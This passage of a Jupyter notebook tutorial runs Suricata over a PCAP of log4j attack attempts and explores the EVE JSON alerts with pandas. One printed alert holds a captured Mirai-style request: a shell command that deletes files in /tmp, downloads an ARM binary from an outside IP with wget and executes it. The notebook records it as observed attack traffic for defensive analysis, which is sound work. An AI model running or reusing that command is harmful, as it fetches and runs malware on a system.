      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using data-directory /var/lib/suricata.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using Suricata configuration /etc/suricata/suricata.yaml\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using /opt/suricata/share/suricata/rules for Suricata provided rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Found Suricata version 7.0.0-beta1 at /opt/suricata/bin/suricata.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[38;5;208mWarning\u001b[0m> -- \u001b[38;5;208mThe source tgreen/hunting is already enabled.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Source tgreen/hunting enabled\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!/home/jovyan/.local/bin/suricata-update enable-source tgreen/hunting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "e474fa73-8c70-4754-93ea-98a3e7f8bc3c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using data-directory /var/lib/suricata.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using Suricata configuration /etc/suricata/suricata.yaml\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using /opt/suricata/share/suricata/rules for Suricata provided rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Found Suricata version 7.0.0-beta1 at /opt/suricata/bin/suricata.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading /etc/suricata/suricata.yaml\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Disabling rules for protocol pgsql\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Disabling rules for protocol modbus\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Disabling rules for protocol dnp3\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Disabling rules for protocol enip\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Last download less than 15 minutes ago. Not downloading https://rules.emergingthreats.net/open/suricata-7.0.0/emerging.rules.tar.gz.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Last download less than 15 minutes ago. Not downloading https://raw.githubusercontent.com/travisbgreen/hunting-rules/master/hunting.rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/app-layer-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/decoder-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/dhcp-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/dnp3-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/dns-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/files.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/http-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/ipsec-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/kerberos-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/modbus-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/nfs-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/ntp-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/smb-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/smtp-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/stream-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loading distribution rule file /opt/suricata/share/suricata/rules/tls-events.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:15\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Ignoring file rules/emerging-deleted.rules\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:15\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Loaded 41240 rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:16\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Disabled 14 rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:16\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Enabled 0 rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:16\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Modified 0 rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:16\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Dropped 0 rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:16\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Enabled 131 rules for flowbit dependencies.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:16\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Backing up current rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:17\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Writing rules to /var/lib/suricata/rules/suricata.rules: total: 41240; enabled: 33494; added: 0; removed 0; modified: 0\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:17\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Writing /var/lib/suricata/rules/classification.config\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:17\u001b[0m - <\u001b[33mInfo\u001b[0m> -- No changes detected, exiting.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!/home/jovyan/.local/bin/suricata-update"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f475067-5bbf-4991-8a2f-f7b513129f07",
   "metadata": {},
   "source": [
    "#### Parsing the PCAP with Suricata\n",
    "\n",
    "Having set up our rule file and downloaded a PCAP to analyze, we can now proceed with parsing it with suricata. Most people know that Suricata can read PCAP files offline with `-r` flag. Not many are aware that Suricata logging directory can be overridden using `-l` flag and that Suricata can be pointed toward a rule file with `-S` or `-s` flags. Capital `-S` means exclusive rule file, meaning all rule files configured in `suricata.yaml` are ignored. Lowercase `-s` adds that file to list of files already in the main configuration. \n",
    "\n",
    "We want predictable output for the notebook, so we choose exclusive load. We also clean any existing logs from the logging directory, so we ensure that it's fully recreated. Suricata would append logs to any existing PCAP files, meaning rerunning the code cell would create duplicate events."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "aca495c0-5d4e-4217-8f4f-42530194306c",
   "metadata": {},
   "outputs": [],
   "source": [
    "LOGDIR = \"/tmp/logs\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "ce065aba-dfa8-4bbc-b497-353195712135",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 0\n",
      "drwxr-xr-x 1 jovyan users   0 Feb  2 10:22 .\n",
      "drwxrwxrwt 1 root   root  286 Feb  2 10:22 ..\n"
     ]
    }
   ],
   "source": [
    "!rm -rf $LOGDIR && mkdir $LOGDIR && ls -lah $LOGDIR"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "554bea89-932b-4c5e-a4f9-8e05accb702a",
   "metadata": {},
   "outputs": [],
   "source": [
    "LOG4J_PCAP = FILES[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "931ff211-6a60-4429-b235-d2d43641578e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32m2/2/2023 -- 10:22:18\u001b[0m - <\u001b[1;33mNotice\u001b[0m> - \u001b[33mThis is Suricata version 7.0.0-beta1 RELEASE running in USER mode\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:18\u001b[0m - <\u001b[33mInfo\u001b[0m> - CPUs/cores online: 12\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:18\u001b[0m - <\u001b[33mInfo\u001b[0m> - fast output device (regular) initialized: fast.log\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:18\u001b[0m - <\u001b[33mInfo\u001b[0m> - eve-log output device (regular) initialized: eve.json\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:18\u001b[0m - <\u001b[33mInfo\u001b[0m> - stats output device (regular) initialized: stats.log\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:22\u001b[0m - <\u001b[33mInfo\u001b[0m> - 1 rule files processed. 33494 rules successfully loaded, 0 rules failed\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:22\u001b[0m - <\u001b[33mInfo\u001b[0m> - Threshold config parsed: 0 rule(s) found\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:22\u001b[0m - <\u001b[33mInfo\u001b[0m> - 33497 signatures processed. 1329 are IP-only rules, 5290 are inspecting packet payload, 26674 inspect application layer, 108 are decoder event only\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[1;33mNotice\u001b[0m> - \u001b[33mThreads created -> RX: 1 W: 12 FM: 1 FR: 1   Engine started.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[33mInfo\u001b[0m> - Starting file run for /tmp/2022-01-01-thru-03-server-activity-with-log4j-attempts.pcap\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[33mInfo\u001b[0m> - No packets with invalid checksum, assuming checksum offloading is NOT used\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[33mInfo\u001b[0m> - pcap file /tmp/2022-01-01-thru-03-server-activity-with-log4j-attempts.pcap end of file reached (pcap err code 0)\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[1;33mNotice\u001b[0m> - \u001b[33mSignal Received.  Stopping engine.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[33mInfo\u001b[0m> - time elapsed 0.127s\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[1;33mNotice\u001b[0m> - \u001b[33mPcap-file module read 1 files, 39208 packets, 3728453 bytes\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[33mInfo\u001b[0m> - Alerts: 149\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:28\u001b[0m - <\u001b[33mInfo\u001b[0m> - cleaning up signature grouping structure... complete\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!suricata -S /var/lib/suricata/rules/suricata.rules -l $LOGDIR -r $LOG4J_PCAP -v"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e786f823-8abe-4fdd-b82d-4ae334c02b63",
   "metadata": {},
   "source": [
    "This should result in some interesting data to analyze in `/tmp/logs/eve.json`. Before we introduce data scientists tooling, let's just extract a single high severity alert to see how a typical EVE event looks like. As you can see, it's a highly nested JSON event with a lot of extra context. Very useful for providing analyst with as much data as possible. But it can be quite daunting to explore, as a single event can already fill entire screen but a production network can produce millions.\n",
    "\n",
    "The example scans the log file until first `alert` is found. Alert is a good first event to look at, since it also includes info from other event types."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "ed557915-ba51-4964-b2ea-93b7d7ab8757",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "4ae589d9-0bd0-4195-bc5b-2bf02be129c9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"timestamp\": \"2022-01-01T19:05:52.130715+0000\",\n",
      "  \"flow_id\": 2151509425429418,\n",
      "  \"pcap_cnt\": 10350,\n",
      "  \"event_type\": \"alert\",\n",
      "  \"src_ip\": \"186.220.97.233\",\n",
      "  \"src_port\": 4873,\n",
      "  \"dest_ip\": \"198.71.247.91\",\n",
      "  \"dest_port\": 80,\n",
      "  \"proto\": \"TCP\",\n",
      "  \"pkt_src\": \"wire/pcap\",\n",
      "  \"tx_id\": 0,\n",
      "  \"alert\": {\n",
      "    \"action\": \"allowed\",\n",
      "    \"gid\": 1,\n",
      "    \"signature_id\": 2029022,\n",
      "    \"rev\": 3,\n",
      "    \"signature\": \"ET SCAN Mirai Variant User-Agent (Inbound)\",\n",
      "    \"category\": \"Attempted Administrator Privilege Gain\",\n",
      "    \"severity\": 1,\n",
      "    \"metadata\": {\n",
      "      \"affected_product\": [\n",
      "        \"Linux\"\n",
      "      ],\n",
      "      \"attack_target\": [\n",
      "        \"IoT\"\n",
      "      ],\n",
      "      \"created_at\": [\n",
      "        \"2019_11_21\"\n",
      "      ],\n",
      "      \"deployment\": [\n",
      "        \"Perimeter\"\n",
      "      ],\n",
      "      \"former_category\": [\n",
      "        \"SCAN\"\n",
      "      ],\n",
      "      \"signature_severity\": [\n",
      "        \"Minor\"\n",
      "      ],\n",
      "      \"updated_at\": [\n",
      "        \"2020_10_29\"\n",
      "      ]\n",
      "    }\n",
      "  },\n",
      "  \"http\": {\n",
      "    \"hostname\": \"127.0.0.1\",\n",
      "    \"http_port\": 80,\n",
      "    \"url\": \"/shell?cd+/tmp;rm+-rf+*;wget+\",\n",
      "    \"http_user_agent\": \"Hello, world\",\n",
      "    \"http_method\": \"GET\",\n",
      "    \"protocol\": \"212.192.216.46/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws HTTP/1.1\",\n",
      "    \"length\": 0\n",
      "  },\n",
      "  \"app_proto\": \"http\",\n",
      "  \"direction\": \"to_server\",\n",
      "  \"flow\": {\n",
      "    \"pkts_toserver\": 5,\n",
      "    \"pkts_toclient\": 5,\n",
      "    \"bytes_toserver\": 594,\n",
      "    \"bytes_toclient\": 848,\n",
      "    \"start\": \"2022-01-01T19:05:51.697545+0000\",\n",
      "    \"src_ip\": \"186.220.97.233\",\n",
      "    \"dest_ip\": \"198.71.247.91\",\n",
      "    \"src_port\": 4873,\n",
      "    \"dest_port\": 80\n",
      "  }\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "with open(\"/tmp/logs/eve.json\", \"r\") as handle:\n",
    "    handle.readline()\n",
    "    for line in handle:\n",
    "        eve = json.loads(line)\n",
    "        if eve.get(\"event_type\", \"\") == \"alert\" and eve.get(\"alert\", {}).get(\"severity\") == 1:\n",
    "            print(json.dumps(eve, indent=2))\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d31b0fe7-5a38-4e75-9dfe-76972d6d98ea",
   "metadata": {
    "tags": []
   },
   "source": [
    "### Dataframes and Pandas\n",
    "\n",
    "JSON is great for building applications and for security analytics. It is structured and most modern no-sql databases default to using it. Nowadays, security analysts are used to reading it. Data scientists and data engineers, however, working with tabular row-column data. Most data mining and machine learning algorithms work on data vectors or matrices, with a matrix essentially just being a vector of vectors. For statistical analysis, those vectors usually contain floating point numbers - some kind of numeric measurements. Each vector would make up a column of data within the matrix, and complex calculations are carried out on them. \n",
    "\n",
    "Sometimes multiple columns are combined to transform raw data into more meaningful context. For example, Suricata measures request and response bytes separately, and analyst might want to sum up those columns. Other times a vector would be scaled or normalized, as measurements might be on different scales and would thus not be directly comparable. For example, defining a generic threshold is very difficult as traffic scale and patterns differ greatly between organizations.\n",
    "\n",
    "Column of data might not be numeric measurements, but rather textual values, booleans, timestamps, categories etc. This is usually the case with NSM data. A classical matrix stores only one *type* of data, usually numbers. A *dataframe* is basically a matrix where each column can be of different type. [Pandas](https://pandas.pydata.org/) is a data analysis and manipulation library that brings dataframes to Python language.\n",
    "\n",
    "Getting started with dataframes is quite simple. The challenge is changing the mindset. Coders experienced in imperative languages might need to relearn what they already know. Statistical analysis is centered around vectors, rather than individual elements. Furthermore, API-s are often declarative and follow functional programming paradigms. Basically, you need to drop the *for loop* and learn how to *apply* functions instead.\n",
    "\n",
    "Reason is performance. CPU-s are really efficient at crunching numbers and SIMD instructions speed up calculations by orders of magnitude. Even the smartest code has a hard time competing with that. Data science libraries in high-level languages such as Python often function as interfaces. They give the user an extensive API that's intuitive to use, yet actually defer the calculations to low level code written in C or C++ that are able to leverage optimized CPU instructions or even GPUs. In other words, passing a vector of data means it might be handled by efficient machine code, whereas looping over items in Python means they will be always evaluated by Python. A language notorious for being slow.\n",
    "\n",
    "In the case of Suricata data, we're mostly working with textual values that would firstly need to be converted into numerical measurements before such gains could be made. Hence, we likely won't see a huge performance increase doing things the *pandas way* rather than *python way*. In fact, sometimes it will be faster to just convert data between python objects and native python data structures, especially when fast random lookup is required (lists are really bad at that). This is a challenge when combining NSM data with data science tools. Concessions need to be made on both sides. Data science tools are not better nor worse than tech stacks that are well established in security. They simply open new possibilities.\n",
    "\n",
    "Benefits of choosing pandas over native python are:\n",
    "\n",
    "* Pandas implements a ton of useful methods for working with and filtering data;\n",
    "* Pandas code can be much more concise that imperative logic in python, often achieving in few lines that would otherwise require complex functions;\n",
    "* Jupyter has native display and visualization support for pandas dataframes, making visual exploration much easier;\n",
    "\n",
    "Choose raw python objects over dataframes when:\n",
    "* complex conversion needs to be made that is not readily provided in Pandas;\n",
    "* fast random access is needed;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "ef327e9c-2a55-47dc-89ab-f62a8f02d5e5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pandas in /opt/conda/lib/python3.10/site-packages (1.5.1)\n",
      "Requirement already satisfied: pytz>=2020.1 in /opt/conda/lib/python3.10/site-packages (from pandas) (2022.7.1)\n",
      "Requirement already satisfied: numpy>=1.21.0 in /opt/conda/lib/python3.10/site-packages (from pandas) (1.23.3)\n",
      "Requirement already satisfied: python-dateutil>=2.8.1 in /opt/conda/lib/python3.10/site-packages (from pandas) (2.8.2)\n",
      "Requirement already satisfied: six>=1.5 in /opt/conda/lib/python3.10/site-packages (from python-dateutil>=2.8.1->pandas) (1.16.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "%pip install pandas"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "19058a46-7875-4ca9-aff7-36cbfd5db03e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "8e8ba50c-8a83-4178-bbef-3e4112b00df3",
   "metadata": {},
   "outputs": [],
   "source": [
    "pd.options.display.html.use_mathjax = False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "cd6d9bf4-a5ce-4976-a1c6-0a8f66fe866f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe tex2jax_ignore\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>src_ip</th>\n",
       "      <th>flow_id</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.1.1.1</td>\n",
       "      <td>123</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2.2.2.2</td>\n",
       "      <td>124</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    src_ip  flow_id\n",
       "0  1.1.1.1      123\n",
       "1  2.2.2.2      124"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.DataFrame([{\"src_ip\": \"1.1.1.1\", \"flow_id\": 123}, {\"src_ip\": \"2.2.2.2\", \"flow_id\": 124}])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3920ee2b-dc39-4fce-8db5-fb95e3204b0c",
   "metadata": {},
   "source": [
    "#### Nested JSON and Pandas\n",
    "\n",
    "As anyone familiar with Suricata EVE format knows, it can be challenging to work with thanks to nested structure and sheer amount of fields. Suricata can log well over 1000 distinct JSON key-value pairs, omitting any that has been disabled in configuration or simply cannot be parsed from a particular flow. For example, a TLS 1.3 connection will for now most likely display a SNI (Server Name Indication) but will not have any certificate fields, as latter are simply not visible in plaintext network view. Sometimes a field only appears in handful of events, making it easy to overlook. Figuring out what is available to work on is a challenge.\n",
    "\n",
    "Pandas provides a useful method `json_normalize` for normalizing nested JSON fields into dataframe. Resulting columns use dot notation to signify nested object, similar to how Elasticsearch does it. For example, `sni` key is part of `tls` section and would be accessible from column `tls.sni`. Missing values are noted as `np.nan`, or *not a number*, which is a statistical analysis convention. As mentioned, statistics is where pandas and underlying *numpy* libraries originated from. A measurement could simply be missing due to bad instrumentation, or it might be result of some algorithm that does not provide meaningful output is some scenarios. For example, dividing by zero is not allowed but nevertheless happens very easily in statistics. When trying to find a ratio between two measurements and second counter is 0, the only possible result is `NaN` as result `0` would be mathematically incorrect.\n",
    "\n",
    "*Not a number* is actually a special floating point value and a perfectly legal data type for vector computing. For Suricata, however, it simply means a missing value and likely has nothing to do with numeric measurements. Think of it as `null` or `None` value.\n",
    "\n",
    "Note that we still need some regular python code to parse individual EVE messages, as built-in pandas `read_json` would assume a full JSON structure rather than *newline delimited* JSON (NDJSON) log. Also note that this method reads all logs into memory and all further processing is also done there as well. Do not expect it to scale over gigabytes of data, unless of course you have access to a lot of RAM on single machine. It's meant for limited data exploration, quick prototyping, etc. Big data analytics when unable to fit into local memory requires supporting infrastructure."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "ff07ea64-8290-4243-b526-d2e33dad28b3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe tex2jax_ignore\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>flow_id</th>\n",
       "      <th>event_type</th>\n",
       "      <th>src_ip</th>\n",
       "      <th>src_port</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>proto</th>\n",
       "      <th>flow.pkts_toserver</th>\n",
       "      <th>flow.pkts_toclient</th>\n",
       "      <th>...</th>\n",
       "      <th>stats.app_layer.error.nfs_udp.internal</th>\n",
       "      <th>stats.app_layer.error.krb5_udp.alloc</th>\n",
       "      <th>stats.app_layer.error.krb5_udp.parser</th>\n",
       "      <th>stats.app_layer.error.krb5_udp.internal</th>\n",
       "      <th>stats.app_layer.expectations</th>\n",
       "      <th>stats.http.memuse</th>\n",
       "      <th>stats.http.memcap</th>\n",
       "      <th>stats.ftp.memuse</th>\n",
       "      <th>stats.ftp.memcap</th>\n",
       "      <th>stats.file_store.open_files</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>1.777836e+15</td>\n",
       "      <td>flow</td>\n",
       "      <td>178.175.173.166</td>\n",
       "      <td>43719.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>23.0</td>\n",
       "      <td>TCP</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2022-01-01T00:01:49.092097+0000</td>\n",
       "      <td>1.521456e+15</td>\n",
       "      <td>dns</td>\n",
       "      <td>209.141.58.15</td>\n",
       "      <td>35550.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>53.0</td>\n",
       "      <td>UDP</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>6.780576e+14</td>\n",
       "      <td>flow</td>\n",
       "      <td>54.83.160.152</td>\n",
       "      <td>NaN</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>NaN</td>\n",
       "      <td>ICMP</td>\n",
       "      <td>2.0</td>\n",
       "      <td>2.0</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>2022-01-01T00:05:51.487413+0000</td>\n",
       "      <td>2.093425e+15</td>\n",
       "      <td>sip</td>\n",
       "      <td>193.46.255.60</td>\n",
       "      <td>5103.0</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>5060.0</td>\n",
       "      <td>UDP</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>2022-01-01T00:00:13.076985+0000</td>\n",
       "      <td>2.068446e+15</td>\n",
       "      <td>flow</td>\n",
       "      <td>18.207.93.95</td>\n",
       "      <td>NaN</td>\n",
       "      <td>198.71.247.91</td>\n",
       "      <td>NaN</td>\n",
       "      <td>ICMP</td>\n",
